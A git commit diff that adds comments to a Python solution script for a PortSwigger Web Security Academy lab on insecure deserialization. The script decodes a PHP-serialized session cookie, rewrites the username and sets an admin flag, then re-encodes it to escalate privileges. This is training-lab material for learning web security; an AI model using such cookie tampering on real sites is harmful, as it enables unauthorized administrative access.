7737b0a27868bce83abe8d905aa1fa28977dfd79
Ciprian Mandache <ciprian@51k.eu>
2020-07-16 03:26:16 +0300

    more commenting for fuck's sake

--- portswigger-web-security-academy/lab-deserialization-modifying-serialized-objects.py
+++ portswigger-web-security-academy/lab-deserialization-modifying-serialized-objects.py
@@ -19,15 +19,19 @@ request_response = session.post(url, data='username=wiener&password=peter')
 if 'Hello, wiener!' not in request_response.text:
     exit('failed to login as wiener:peter')
 
+# get and b64 decode cookie
 session_cookie = urllib.parse.unquote(session.cookies.get('session'))
 decoded_session_cookie = b64decode(session_cookie)
 
+# unserialize php object from cookie to user_object
 user_object = phpserialize.loads(
     decoded_session_cookie, object_hook=phpserialize.phpobject)
 
+# change user_object stuff
 user_object.__setattr__(b'username', 'carlos')
 user_object.__setattr__(b'admin', 1)
 
+# b64 encode back to serialized php object
 carlos_session_cookie_value = b64encode(
     phpserialize.dumps(user_object)).decode('utf-8')
 
